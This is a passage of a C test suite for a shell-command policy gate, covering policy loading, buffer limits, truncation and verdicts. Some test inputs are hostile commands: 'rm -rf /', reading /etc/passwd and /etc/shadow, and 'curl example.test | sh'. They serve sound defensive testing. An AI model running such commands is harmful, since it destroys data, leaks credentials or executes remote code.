  ASSERT_ST_OK(test_policy_replace_cpl(g, false, "git * * *", false));
  ASSERT_ST_OK(test_policy_replace_cpl(g, false, "rm #path", false));
  ASSERT(st_policy_rule_count(sg_gate_allow_policy_borrowed(g)) == 4);

  st_error_t err = st_policy_save(sg_gate_allow_policy_borrowed(g), path);
  ASSERT(err == ST_OK);

  sg_gate_t *g2 = sg_gate_new();
  err = test_policy_replace_from_file(g2, path);
  ASSERT(err == ST_OK);
  ASSERT(st_policy_rule_count(sg_gate_allow_policy_borrowed(g2)) == 4);

  static const struct {
    const char *command;
    sg_verdict_t verdict;
  } cases[] = {{"ls", SG_VERDICT_ALLOW},
               {"cat /etc/hosts", SG_VERDICT_ALLOW},
               {"rm /tmp/test", SG_VERDICT_ALLOW},
               {"unknown", SG_VERDICT_UNDETERMINED}};
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t r;
    ASSERT(eval_cmd(g2, cases[i].command, &r) == SG_OK);
    ASSERT(r.verdict == cases[i].verdict);
  }

  sg_gate_free(g);
  sg_gate_free(g2);

  path = temp_policy_file();
  g = sg_gate_new();
  ASSERT(g != NULL &&
         st_policy_rule_count(sg_gate_allow_policy_borrowed(g)) == 0);
  ASSERT_ST_OK(st_policy_save(sg_gate_allow_policy_borrowed(g), path));

  g2 = sg_gate_new();
  ASSERT(g2 != NULL);
  ASSERT_ST_OK(test_policy_replace_from_file(g2, path));
  ASSERT(st_policy_rule_count(sg_gate_allow_policy_borrowed(g2)) == 0);

  sg_result_t r;
  ASSERT_SG_OK(eval_cmd(g2, "ls", &r));
  ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
  sg_gate_free(g);
  sg_gate_free(g2);

  path = temp_policy_file();
  FILE *f = fopen(path, "w");
  ASSERT(f != NULL);
  ASSERT(fprintf(f, "NOT A VALID SHELLGATE POLICY FILE\n") > 0);
  ASSERT(fprintf(f, "This is just garbage text that should fail to load\n") >
         0);
  ASSERT(fclose(f) == 0);

  g = sg_gate_new();
  ASSERT(g != NULL);
  ASSERT_ST_OK(test_policy_replace_cpl(g, false, "ls", false));
  err = test_policy_replace_from_file(g, path);
  ASSERT(err != ST_OK);
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(g, "ls", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  sg_gate_free(g);
}

/* --- BUFFER MANAGEMENT --- */

TEST(eval_workspace_prefix_boundaries) {
  static const size_t lengths[] = {11, 64, 4096};
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  char source[4097];
  size_t alignment = shell_dep_workspace_alignment();
  ASSERT(sg_test_eval_workspace_size(SIZE_MAX) == 0);
  for (size_t i = 0; i < sizeof(lengths) / sizeof(lengths[0]); i++) {
    size_t length = lengths[i];
    memset(source, ' ', length);
    memcpy(source, "echo $VALUE", 11);
    source[length] = 0;
    size_t hint = sg_gate_evaluate_size_hint(length);
    size_t workspace = sg_test_eval_workspace_size(length);
    ASSERT(workspace != 0 && hint + alignment + 7 < sizeof(eval_buf));
    for (size_t offset = 0; offset < alignment; offset++) {
      char *buffer = eval_buf + offset;
      const size_t capacities[] = {workspace - 1, workspace,
                                   workspace + alignment,
                                   workspace + 128 + alignment - 1};
      const sg_error_t errors[] = {SG_ERR_MEMORY, SG_ERR_MEMORY, SG_ERR_TRUNC,
                                   SG_OK};
      for (size_t boundary = 0; boundary < 4; boundary++) {
        size_t size = capacities[boundary];
        size_t prefix = sg_test_eval_prefix_size(buffer, size, length);
        sg_result_t result = {0};
        ASSERT(sg_gate_evaluate(gate, source, length, buffer, size, &result) ==
               errors[boundary]);
        ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
        if (boundary < 2) {
          ASSERT(prefix == 0 && !result.truncated &&
                 result.subcommand_count == 0 &&
                 result.unresolved_expansion_flags == 0);
          ASSERT_STR(result.deny_reason, "depgraph workspace unavailable");
        } else {
          ASSERT(prefix > 0 && result.subcommand_count == 1 &&
                 result.truncated == (boundary == 2) &&
                 result.unresolved_expansion_flags ==
                     SG_EXPANSION_UNRESOLVED_ARGV &&
                 result.subcommands[0].unresolved_expansion_flags ==
                     SG_EXPANSION_UNRESOLVED_ARGV);
          ASSERT(result_fields_stay_in_buffer(&result, buffer, prefix));
        }
      }
      for (size_t extra = 0; extra <= 7; extra += 7) {
        size_t size = hint + extra;
        size_t prefix = sg_test_eval_prefix_size(buffer, size, length);
        ASSERT(prefix != 0 && prefix + workspace <= size);
        ASSERT(((uintptr_t)(buffer + prefix) % alignment) == 0);
        ASSERT(size - prefix - workspace < alignment);
        ASSERT(sg_test_eval_prefix_size(buffer, workspace - 1, length) == 0);
        sg_result_t result = {0};
        ASSERT_SG_OK(
            sg_gate_evaluate(gate, source, length, buffer, size, &result));
        ASSERT(result.subcommand_count == 1);
        uintptr_t argument = (uintptr_t)result.subcommands[0].netargv;
        ASSERT(argument >= (uintptr_t)buffer &&
               argument - (uintptr_t)buffer < prefix &&
               result.subcommands[0].netargv_length <=
                   prefix - (size_t)(argument - (uintptr_t)buffer));
        ASSERT(result_fields_stay_in_buffer(&result, buffer, prefix));
        if (offset == 0) {
          ASSERT(result_fields_stay_in_prefix(&result, prefix));
          /* Exercise the checker itself, not only valid production results. */
          buffer[prefix - 1] = buffer[prefix] = 0;
          result.deny_reason = buffer + prefix - 1;
          ASSERT(result_fields_stay_in_prefix(&result, prefix));
          result.deny_reason = buffer + prefix;
          ASSERT(!result_fields_stay_in_prefix(&result, prefix));
        }
      }
    }
  }
  sg_gate_free(gate);
}

TEST(buffer_contract_matrix) {
  static const struct {
    const char *command;
    size_t buffer_size;
  } cases[] = {
      {"ls | sort | cat", 4}, {"rm -rf /", 8}, {"cat /etc/passwd", 16}};
  const char *rules[] = {"ls", "sort", "cat #path"};
  sg_gate_t *g = gate_with_rules(rules, 3);
  ASSERT_ST_OK(test_policy_replace_cpl(g, true, "rm", false));

  ASSERT_SG_OK(sg_gate_set_reject_mask(g, SHELL_FEAT_VARS));
  char feature_buffer[4];
  sg_result_t feature_result;
  ASSERT(sg_gate_evaluate(g, "echo $VALUE", strlen("echo $VALUE"),
                          feature_buffer, sizeof(feature_buffer),
                          &feature_result) == SG_ERR_TRUNC);
  ASSERT(feature_result.truncated);
  ASSERT(feature_result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT_SG_OK(sg_gate_set_reject_mask(g, SG_REJECT_MASK_DEFAULT));

  /* Early feature rejections run before workspace partitioning. The complete
   * caller buffer is available even when the capacity was constructed with a
   * deliberately tiny hypothetical graph-result prefix. */
  size_t early_feature_buffer_size =
      eval_buffer_size_for_prefix("echo $VALUE", 4);
  size_t early_feature_prefix =
      eval_result_prefix_size("echo $VALUE", early_feature_buffer_size);
  ASSERT(early_feature_buffer_size != 0 && early_feature_prefix != 0);
  ASSERT_SG_OK(sg_gate_set_reject_mask(g, SHELL_FEAT_VARS));
  ASSERT(eval_with_prefix(g, "echo $VALUE", 4, &feature_result) == SG_OK);
  ASSERT(!feature_result.truncated &&
         feature_result.verdict == SG_VERDICT_REJECT &&
         feature_result.deny_reason != NULL &&
         strlen(feature_result.deny_reason) > 4 &&
         result_fields_stay_in_prefix(&feature_result,
                                      early_feature_buffer_size) &&
         !result_fields_stay_in_prefix(&feature_result, early_feature_prefix));
  ASSERT_SG_OK(sg_gate_set_reject_mask(g, SG_REJECT_MASK_DEFAULT));

  /* A syntactically valid evaluation cannot silently allocate resolver state
   * when the caller left room only for diagnostics. */
  char workspace_too_small[SG_DIAGNOSTIC_BUF_MIN] = {0};
  sg_result_t workspace_result;
  ASSERT(sg_gate_evaluate(g, "ls", 2, workspace_too_small,
                          sizeof(workspace_too_small),
                          &workspace_result) == SG_ERR_MEMORY);
  ASSERT(workspace_result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT(!workspace_result.truncated);
  ASSERT_STR(workspace_result.deny_reason, "depgraph workspace unavailable");

  /* The resolver tail also cannot consume the entire caller buffer: the
   * evaluator needs at least one byte in its result prefix.  Align this test
   * buffer explicitly so its exact size reaches that boundary on every
   * supported allocator. */
  size_t workspace_size = sg_test_eval_workspace_size(2);
  size_t workspace_alignment = shell_dep_workspace_alignment();
  ASSERT(workspace_size != 0);
  ASSERT(workspace_alignment != 0);
  ASSERT(workspace_size <= SIZE_MAX - workspace_alignment);
  char *exact_workspace_raw = malloc(workspace_size + workspace_alignment);
  ASSERT(exact_workspace_raw != NULL);
  uintptr_t raw_address = (uintptr_t)(void *)exact_workspace_raw;
  uintptr_t remainder = raw_address % workspace_alignment;
  char *exact_workspace =
      exact_workspace_raw +
      (remainder == 0 ? 0 : workspace_alignment - remainder);
  ASSERT(sg_gate_evaluate(g, "ls", 2, exact_workspace, workspace_size,
                          &workspace_result) == SG_ERR_MEMORY);
  ASSERT(workspace_result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT(!workspace_result.truncated);
  ASSERT_STR(workspace_result.deny_reason, "depgraph workspace unavailable");
  free(exact_workspace_raw);

  /* Failed parsing happens before the depgraph workspace is partitioned.  A
   * caller that cannot retain even its short diagnostic still gets an explicit
   * undetermined result, whether parsing failed before or after a command. */
  char one_byte_buffer[1];
  ASSERT(sg_gate_evaluate(g, "ls", 2, one_byte_buffer, sizeof(one_byte_buffer),
                          &workspace_result) == SG_ERR_MEMORY);
  ASSERT(workspace_result.truncated);
  ASSERT(workspace_result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT(sg_gate_evaluate(g, "'", 1, one_byte_buffer, sizeof(one_byte_buffer),
                          &workspace_result) == SG_ERR_TRUNC);
  ASSERT(workspace_result.truncated);
  ASSERT(workspace_result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT(sg_gate_evaluate(g, "ls; '", strlen("ls; '"), one_byte_buffer,
                          sizeof(one_byte_buffer),
                          &workspace_result) == SG_ERR_TRUNC);
  ASSERT(workspace_result.truncated);
  ASSERT(workspace_result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT(sg_gate_evaluate(g, "{ echo }", strlen("{ echo }"), one_byte_buffer,
                          sizeof(one_byte_buffer),
                          &workspace_result) == SG_ERR_TRUNC);
  ASSERT(workspace_result.truncated);
  ASSERT(workspace_result.verdict == SG_VERDICT_UNDETERMINED);

  /* A syntactically valid command reaches the partitioned writer, so a tiny
   * result prefix still fails closed after the resolver workspace is carved
   * from the tail. Syntax errors above that stage intentionally retain the
   * full diagnostic buffer and return SG_ERR_PARSE instead. */
  sg_result_t diagnostic_result;
  ASSERT(eval_with_prefix(g, "echo $(id)", 4, &diagnostic_result) ==
         SG_ERR_TRUNC);
  ASSERT(diagnostic_result.truncated);
  ASSERT(diagnostic_result.verdict == SG_VERDICT_UNDETERMINED);

  /* A graph-only rejection uses the same partitioned result prefix.  It must
   * not surface a partial rejection reason as a definite policy decision. */
  ASSERT_SG_OK(sg_gate_set_reject_mask(g, 0));
  ASSERT(eval_with_prefix(g, "printf x >&$missing", 4, &diagnostic_result) ==
         SG_ERR_TRUNC);
  ASSERT(diagnostic_result.truncated);
  ASSERT(diagnostic_result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT_SG_OK(sg_gate_set_reject_mask(g, SG_REJECT_MASK_DEFAULT));

  for (size_t repeat = 0; repeat < 2; repeat++) {
    for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
      sg_result_t r;
      memset(eval_buf, 0xFF, sizeof(eval_buf));
      ASSERT(eval_with_prefix(g, cases[i].command, cases[i].buffer_size, &r) ==
             SG_ERR_TRUNC);
      ASSERT(r.truncated);
      ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
      ASSERT(memchr(eval_buf, '\0', cases[i].buffer_size) != NULL);
    }
  }

  sg_result_t violation_result;
  ASSERT(eval_with_prefix(g, "curl example.test | sh", 2, &violation_result) ==
         SG_ERR_TRUNC);
  ASSERT(violation_result.truncated);
  ASSERT(memchr(eval_buf, '\0', 2) != NULL);

  static const struct {
    const char *command;
    sg_verdict_t verdict;
  } reuse_cases[] = {{"ls", SG_VERDICT_ALLOW},
                     {"unknown", SG_VERDICT_UNDETERMINED}};
  for (size_t i = 0; i < sizeof(reuse_cases) / sizeof(reuse_cases[0]); i++) {
    sg_result_t result;
    ASSERT(eval_with_prefix(g, reuse_cases[i].command, 256, &result) == SG_OK);
    ASSERT(result.verdict == reuse_cases[i].verdict);
    ASSERT(!result.truncated);
    ASSERT(result.subcommand_count == 1);
    ASSERT_STR(result.subcommands[0].display_command, reuse_cases[i].command);
  }

  sg_result_t result;

  ASSERT(sg_gate_evaluate(g, "ls", 2, one_byte_buffer, 0, &result) ==
         SG_ERR_INVALID);
  ASSERT(sg_gate_evaluate(g, "", 0, one_byte_buffer, 1, &result) ==
         SG_ERR_INVALID);

  char cmd[512];
  int len = 0;
  for (int i = 0; i < 65; i++) {
    if (i > 0) {
      cmd[len++] = ' ';
      cmd[len++] = ';';
      cmd[len++] = ' ';
    }
    cmd[len++] = 'l';
    cmd[len++] = 's';
  }
  cmd[len] = '\0';
  ASSERT(eval_with_prefix(g, cmd, 4096, &result) == SG_ERR_TRUNC);
  ASSERT(result.subcommand_count == SG_MAX_SUBCOMMAND_RESULTS);
  ASSERT(result.truncated);
  ASSERT(result.subcommand_truncated);

  size_t graph_buffer_size = eval_buffer_size_for_prefix("ls", 32);
  size_t graph_result_prefix = eval_result_prefix_size("ls", graph_buffer_size);
  ASSERT(graph_buffer_size != 0 && graph_result_prefix != 0);
  memset(eval_buf, 0xFF, sizeof(eval_buf));
  ASSERT(eval_with_prefix(g, "ls", 32, &result) == SG_OK);
  ASSERT(!result.truncated);
  ASSERT_STR(result.subcommands[0].display_command, "ls");
  ASSERT(result.subcommands[0].netargv != NULL &&
         (uintptr_t)(void *)result.subcommands[0].display_command >=
             (uintptr_t)(void *)eval_buf &&
         (size_t)((uintptr_t)(void *)result.subcommands[0].display_command -
                  (uintptr_t)(void *)eval_buf) < graph_result_prefix &&
         (uintptr_t)(void *)result.subcommands[0].netargv >=
             (uintptr_t)(void *)eval_buf &&
         (size_t)((uintptr_t)(void *)result.subcommands[0].netargv -
                  (uintptr_t)(void *)eval_buf) <= graph_result_prefix &&
         result.subcommands[0].netargv_length <=
             graph_result_prefix -
                 (size_t)((uintptr_t)(void *)result.subcommands[0].netargv -
                          (uintptr_t)(void *)eval_buf));
  ASSERT(memchr(eval_buf, '\0', 32) != NULL);

  ASSERT_SG_OK(sg_gate_enable_anomaly(g, 5.0, NULL));
  static const char anomaly_command[] =
      "ls -la /tmp ; cd /var/log ; pwd ; cat somefile.txt";
  size_t anomaly_vocab_before = test_anomaly_vocabulary(g);
  memset(eval_buf, 0xFF, sizeof(eval_buf));
  ASSERT(eval_with_prefix(g, anomaly_command, 16, &result) == SG_ERR_TRUNC);
  ASSERT(result.truncated);
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT_EQ_UINT(test_anomaly_vocabulary(g), anomaly_vocab_before);
  ASSERT(memchr(eval_buf, '\0', 16) != NULL);

  size_t hint = sg_gate_evaluate_size_hint(strlen(anomaly_command));
  char *hint_buffer = malloc(hint);
  ASSERT(hint_buffer != NULL);
  ASSERT(sg_gate_evaluate(g, anomaly_command, strlen(anomaly_command),
                          hint_buffer, hint, &result) == SG_OK);
  ASSERT(!result.truncated);
  /* A truncated attempt must be a complete no-op for anomaly learning. The
   * successful retry therefore has the same model and pre-update score as one
   * complete evaluation on a fresh equivalent gate. */
  sg_gate_t *retry_reference = gate_with_rules(rules, 3);
  ASSERT(retry_reference != NULL);
  ASSERT_ST_OK(test_policy_replace_cpl(retry_reference, true, "rm", false));
  ASSERT_SG_OK(sg_gate_enable_anomaly(retry_reference, 5.0, NULL));
  char *reference_buffer = malloc(hint);
  ASSERT(reference_buffer != NULL);
  sg_result_t reference_result;
  ASSERT(sg_gate_evaluate(retry_reference, anomaly_command,
                          strlen(anomaly_command), reference_buffer, hint,
                          &reference_result) == SG_OK);
  ASSERT_EQ_UINT(test_anomaly_vocabulary(g),
                 test_anomaly_vocabulary(retry_reference));
  sg_result_t retry_probe, reference_probe;
  ASSERT_SG_OK(eval_cmd(g, "printf unique retry probe", &retry_probe));
  ASSERT_SG_OK(
      eval_cmd(retry_reference, "printf unique retry probe", &reference_probe));
  ASSERT(fabs(retry_probe.anomaly_score - reference_probe.anomaly_score) <
         1e-12);
  ASSERT(fabs(retry_probe.anomaly_score_raw -
              reference_probe.anomaly_score_raw) < 1e-12);
  ASSERT(fabs(retry_probe.anomaly_score_type -
              reference_probe.anomaly_score_type) < 1e-12);
  free(reference_buffer);
  sg_gate_free(retry_reference);
  free(hint_buffer);
  /* Every caller-buffer alignment must reserve the same usable workspace
   * without requiring a hidden allocation or an aligned buffer base. */
  char *alignment_buffer = malloc(hint + workspace_alignment - 1);
  ASSERT(alignment_buffer != NULL);
  for (size_t offset = 0; offset < workspace_alignment; offset++) {
    ASSERT(sg_gate_evaluate(g, anomaly_command, strlen(anomaly_command),
                            alignment_buffer + offset, hint, &result) == SG_OK);
    ASSERT(!result.truncated);
  }
  free(alignment_buffer);
  ASSERT_SG_OK(eval_cmd(g, anomaly_command, &result));
  ASSERT(!result.truncated);

  /* Nested substitutions can make the rendered stage list grow faster than
   * the source itself. The public hint is intentionally advisory, and a
   * truncation must remain safe to retry without learning a partial record. */
  char nested_command[1024] = "echo nested";
  for (size_t depth = 0; depth < 16; depth++) {
    char wrapped[sizeof(nested_command)];
    int written = snprintf(wrapped, sizeof(wrapped), "printf '%%s' \"$(%s)\"",
                           nested_command);
    ASSERT(written > 0 && (size_t)written < sizeof(wrapped));
    memcpy(nested_command, wrapped, (size_t)written + 1);
  }
  sg_gate_t *nested_gate = sg_gate_new();
  ASSERT(nested_gate != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(nested_gate, 5.0, NULL));
  size_t nested_hint = sg_gate_evaluate_size_hint(strlen(nested_command));
  ASSERT(nested_hint != SIZE_MAX);
  char *nested_buffer = malloc(nested_hint);
  ASSERT(nested_buffer != NULL);
  sg_result_t nested_result;
  ASSERT(sg_gate_evaluate(nested_gate, nested_command, strlen(nested_command),
                          nested_buffer, nested_hint,
                          &nested_result) == SG_ERR_TRUNC);
  ASSERT(nested_result.truncated && !nested_result.subcommand_truncated);
  ASSERT_EQ_UINT(test_anomaly_vocabulary(nested_gate), 0);
  char *nested_grown = realloc(nested_buffer, nested_hint * 2);
  ASSERT(nested_grown != NULL);
  nested_buffer = nested_grown;
  ASSERT(sg_gate_evaluate(nested_gate, nested_command, strlen(nested_command),
                          nested_buffer, nested_hint * 2,
                          &nested_result) == SG_OK);
  ASSERT(test_anomaly_vocabulary(nested_gate) > 0);
  free(nested_buffer);
  sg_gate_free(nested_gate);
  sg_gate_free(g);
}

TEST(graph_result_fields_stay_out_of_workspace) {
  static const char *const allow_rules[] = {"ls", "cat #path", "echo *"};
  const size_t requested_prefix = 2048;
  size_t buffer_size = eval_buffer_size_for_prefix("ls", requested_prefix);
  size_t result_prefix = eval_result_prefix_size("ls", buffer_size);
  ASSERT(buffer_size != 0 && result_prefix >= requested_prefix);

  sg_gate_t *gate = gate_with_rules(allow_rules, sizeof(allow_rules) /
                                                     sizeof(allow_rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, true, "blocked", false));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = "/workspace/result-prefix";
  config.sensitive_write_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));

  sg_result_t result = {0};
  ASSERT(eval_with_prefix(gate, "ls", requested_prefix, &result) == SG_OK);
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         result_fields_stay_in_prefix(&result, result_prefix));

  ASSERT(eval_with_prefix(gate, "blocked", requested_prefix, &result) == SG_OK);
  buffer_size = eval_buffer_size_for_prefix("blocked", requested_prefix);
  result_prefix = eval_result_prefix_size("blocked", buffer_size);
  ASSERT(result.verdict == SG_VERDICT_DENY &&
         result.subcommands[0].reject_reason != NULL &&
         result_fields_stay_in_prefix(&result, result_prefix));

  ASSERT(eval_with_prefix(gate, "echo data > /workspace/result-prefix",
                          requested_prefix, &result) == SG_OK);
  buffer_size = eval_buffer_size_for_prefix(
      "echo data > /workspace/result-prefix", requested_prefix);
  result_prefix = eval_result_prefix_size(
      "echo data > /workspace/result-prefix", buffer_size);
  ASSERT(result.has_violations && result.violation_count > 0 &&
         result_fields_stay_in_prefix(&result, result_prefix));

  /* A graph-backed truncation may retain a useful command or violation
   * prefix, but no public pointer may cross into the route workspace tail. */
  bool saw_graph_truncation = false;
  bool saw_retained_graph_result = false;
  for (size_t prefix = 1; prefix <= 256; prefix++) {
    size_t buffer_size = eval_buffer_size_for_prefix(
        "echo data > /workspace/result-prefix", prefix);
    size_t result_prefix = eval_result_prefix_size(
        "echo data > /workspace/result-prefix", buffer_size);
    ASSERT(buffer_size != 0 && result_prefix != 0);
    sg_error_t error = eval_with_prefix(
        gate, "echo data > /workspace/result-prefix", prefix, &result);
    if (error != SG_ERR_TRUNC)
      continue;
    saw_graph_truncation = true;
    ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED &&
           result_fields_stay_in_prefix(&result, result_prefix));
    saw_retained_graph_result =
        saw_retained_graph_result || result.subcommand_count != 0 ||
        result.violation_count != 0 || result.deny_reason != NULL;
  }
  ASSERT(saw_graph_truncation && saw_retained_graph_result);
  sg_gate_free(gate);

  const char *const suggestion_rules[] = {"lss"};
  gate = gate_with_rules(suggestion_rules, sizeof(suggestion_rules) /
                                               sizeof(suggestion_rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, true));
  ASSERT(eval_with_prefix(gate, "ls", requested_prefix, &result) == SG_OK);
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
         result.suggestion_count > 0 &&
         result_fields_stay_in_prefix(&result, result_prefix));
  sg_gate_free(gate);
}

TEST(final_diagnostic_truncation_fails_closed) {
  const char *rules[] = {"lss"};
  sg_gate_t *gate = gate_with_rules(rules, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, true));

  /* The first stage produces a retained suggestion; the long second stage
   * makes a later diagnostic write exhaust selected result prefixes. */
  static const char command[] =
      "ls ; "
      "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
      "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
  bool exercised = false;
  for (size_t buffer_size = 1; buffer_size <= 512;
       buffer_size += buffer_size < 64 ? 1 : 8) {
    sg_result_t result;
    sg_error_t error = eval_with_prefix(gate, command, buffer_size, &result);
    ASSERT(result.truncated == (error == SG_ERR_TRUNC));
    if (error == SG_ERR_TRUNC && result.suggestion_count > 0) {
      exercised = true;
      ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
    }
  }
  ASSERT(exercised);
  sg_gate_free(gate);
}

/* Suggestions are separately rendered diagnostics.  Exercise two allow and
 * two deny candidates through both the complete result and every useful
 * short-prefix boundary: a truncated rendering must never retain a definite
 * policy verdict, while a sufficiently large caller buffer retains each
 * independently useful suggestion. */
TEST(suggestion_streaming_buffer_contract) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "cat #path", false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, true, "rm #path", false));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, true));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  static const char command[] = "cat /tmp/one /tmp/two; rm /tmp/one /tmp/two";
  sg_result_t complete;
  ASSERT_SG_OK(eval_cmd(gate, command, &complete));
  ASSERT(complete.suggestion_count == 2);
  ASSERT(complete.deny_suggestion_count == 2);
  ASSERT(complete.suggestions[0] != NULL && complete.suggestions[1] != NULL);
  ASSERT(complete.deny_suggestions[0] != NULL &&
         complete.deny_suggestions[1] != NULL);

  bool saw_truncation = false;
  for (size_t prefix = 1; prefix <= 256; prefix++) {
    sg_result_t result;
    sg_error_t error = eval_with_prefix(gate, command, prefix, &result);
    ASSERT(result.truncated == (error == SG_ERR_TRUNC));
    if (error == SG_ERR_TRUNC) {
      saw_truncation = true;
      ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
    } else {
      ASSERT(error == SG_OK);
      ASSERT(result.suggestion_count == 2);
      ASSERT(result.deny_suggestion_count == 2);
    }
  }
  ASSERT(saw_truncation);
  sg_gate_free(gate);
}

/* --- VERDICT HELPERS --- */

TEST(helper_contracts) {
  static const struct {
    sg_verdict_t verdict;
    const char *name;
  } verdicts[] = {{SG_VERDICT_ALLOW, "ALLOW"},
                  {SG_VERDICT_DENY, "DENY"},
                  {SG_VERDICT_REJECT, "REJECT"},
                  {SG_VERDICT_UNDETERMINED, "UNDETERMINED"},
                  {SG_VERDICT_ALLOW_CONDITIONAL, "ALLOW_CONDITIONAL"},
                  {(sg_verdict_t)-1, "UNKNOWN"}};
  for (size_t i = 0; i < sizeof(verdicts) / sizeof(verdicts[0]); i++)
    ASSERT_STR(sg_verdict_name(verdicts[i].verdict), verdicts[i].name);

  static const size_t lengths[] = {0, 10, 100};
  size_t previous = 0;
  for (size_t i = 0; i < sizeof(lengths) / sizeof(lengths[0]); i++) {
    size_t hint = sg_gate_evaluate_size_hint(lengths[i]);
    ASSERT(hint > previous);
    previous = hint;
  }
  ASSERT(sg_gate_evaluate_size_hint(SIZE_MAX) == SIZE_MAX);
  /* Long inputs also reserve decoded/identity scratch, not just diagnostics. */
  size_t long_length = 16u * 1024u * 1024u;
  ASSERT(sg_gate_evaluate_size_hint(long_length) >= long_length * 8);
  ASSERT(sg_gate_evaluate_size_hint(SIZE_MAX / 4) == SIZE_MAX);

  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  ASSERT_ST_OK(test_policy_replace_cpl(g, false, "ls", false));
  ASSERT_ST_OK(test_policy_replace_cpl(g, false, "cat #path", false));
  ASSERT_ST_OK(test_policy_replace_cpl(g, true, "cat /etc/shadow", false));

  sg_result_t result;
  ASSERT(eval_cmd(g, "ls ; cat /etc/shadow", &result) == SG_OK);
  ASSERT(result.attention_index == 1);
  ASSERT(result.violation_dropped_count == 0);
  sg_gate_free(g);
}

TEST(contextual_policy_mutations_preserve_verdicts) {
  static const struct {
    const char *exact, *general, *command;
  } cases[] = {
      {"kill 9", "kill #n", "kill 9"},
      {"grep /tmp/x", "grep #p", "grep /tmp/x"},
      {"tool #opt 9", "tool #opt #n", "tool -s 9"},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    for (unsigned deny = 0; deny < 2; deny++) {
      for (unsigned order = 0; order < 2; order++) {
        sg_gate_t *gate = sg_gate_new();
        ASSERT(gate != NULL);
        const char *rules[] = {cases[i].exact, cases[i].general};
        for (unsigned step = 0; step < 2; step++) {
          const char *rule = rules[order ^ step];
          ASSERT_ST_OK(deny
                           ? test_policy_replace_cpl(gate, true, rule, false)
                           : test_policy_replace_cpl(gate, false, rule, false));
        }
        sg_result_t result;
        ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
        ASSERT(result.verdict == (deny ? SG_VERDICT_DENY : SG_VERDICT_ALLOW));
        sg_gate_free(gate);
      }
    }
  }
}

/* --- EXPANSION CALLBACKS --- */

static shell_expand_status_t
expand_canonical_cstr(const shell_expand_word_request_t *request,
                      const char **netargv, size_t *length, void *ctx) {
  (void)request;
  const char *encoded = ctx;
  if (!encoded)
    return SHELL_EXPAND_UNRESOLVED;
  *netargv = encoded;
  *length = strlen(encoded);
  return SHELL_EXPAND_RESOLVED;
}

static shell_expand_status_t
expand_home_canonical(const shell_expand_word_request_t *request,
                      const char **netargv, size_t *length, void *ctx) {
  const char *word = request->source + request->word_offset;
  size_t word_length = request->word_length;
  bool home = (word_length == 5 && memcmp(word, "$HOME", 5) == 0) ||
              (word_length == 7 && memcmp(word, "${HOME}", 7) == 0);
  return home ? expand_canonical_cstr(request, netargv, length, ctx)
              : SHELL_EXPAND_UNRESOLVED;
}

static shell_expand_status_t
expand_txt_canonical(const shell_expand_word_request_t *request,
                     const char **netargv, size_t *length, void *ctx) {
  const char *pattern = request->source + request->word_offset;
  size_t pattern_length = request->word_length;
  return pattern_length == 5 && memcmp(pattern, "*.txt", 5) == 0
             ? expand_canonical_cstr(request, netargv, length, ctx)
             : SHELL_EXPAND_UNRESOLVED;
}

static shell_expand_status_t
expand_invalid_canonical(const shell_expand_word_request_t *request,
                         const char **netargv, size_t *length, void *ctx) {
  (void)request;
  (void)ctx;
  *netargv = NULL;
  *length = 0;
  return (shell_expand_status_t)2;
}

TEST(expansion_callback_matrix) {
  enum expansion_kind { EXPAND_NONE, EXPAND_VARIABLE, EXPAND_GLOB };
  static char home_context[] = "13:/context/home,";
  static char glob_context[] = "7:one.txt,7:two.txt,9:three.txt,";
  static const struct {
    const char *rule;
    const char *input;
    const char *expanded;
    void *context;
    enum expansion_kind kind;
  } cases[] = {
      {"ls #path", "ls $HOME", "ls /context/home", home_context,
       EXPAND_VARIABLE},
      {"echo $UNKNOWN", "echo $UNKNOWN", "echo $UNKNOWN", home_context,
       EXPAND_VARIABLE},
